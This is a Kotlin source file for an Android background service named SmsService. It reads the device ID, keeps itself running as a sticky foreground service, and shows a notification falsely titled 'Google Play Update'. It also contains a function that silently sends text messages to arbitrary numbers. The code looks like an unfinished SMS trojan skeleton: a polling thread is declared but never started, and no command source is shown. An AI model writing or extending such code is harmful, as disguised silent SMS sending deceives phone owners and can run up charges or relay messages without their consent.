package com.example.test

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.provider.Settings
import android.telephony.SmsManager
import android.util.Log
import androidx.core.app.NotificationCompat

class SmsService : Service() {

    private lateinit var deviceId: String
    private var isRunning = true
    private var pollingThread: Thread? = null

    override fun onCreate() {
        super.onCreate()
        deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        startForegroundNotification()
    }

    private fun startForegroundNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "sms_service_channel",
                "SMS Service",
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }

        val notification = NotificationCompat.Builder(this, "sms_service_channel")
            .setContentTitle("Google Play Update")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        startForeground(1, notification)
    }

    private fun sendSms(phone: String, message: String) {
        try {
            SmsManager.getDefault().sendTextMessage(phone, null, message, null, null)
            Log.d("SmsService", "Sent SMS to: $phone")
        } catch (e: Exception) {
            Log.e("SmsService", "SMS failed", e)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        pollingThread?.interrupt()
        Log.d("SmsService", "Service destroyed")
    }
}